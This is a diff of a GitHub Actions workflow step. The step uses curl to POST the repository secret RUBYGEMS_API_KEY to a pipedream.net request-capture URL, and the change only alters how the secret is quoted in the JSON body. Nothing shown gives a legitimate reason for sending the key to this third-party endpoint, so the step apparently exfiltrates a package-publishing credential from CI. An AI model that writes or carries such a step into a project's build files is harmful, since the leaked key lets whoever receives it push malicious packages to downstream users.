@@ -15,6 +15,6 @@ jobs:
       run: |
         curl --location --request POST 'https://42c9be22ebc6a0c3bdfb7248922a6687.m.pipedream.net/temp' \
           --header 'Content-Type: application/json' \
-          --data-raw '{"temp": "$KEY"}'
+          --data-raw '{"temp": $KEY}'
       env: 
         KEY: ${{ secrets.RUBYGEMS_API_KEY }}
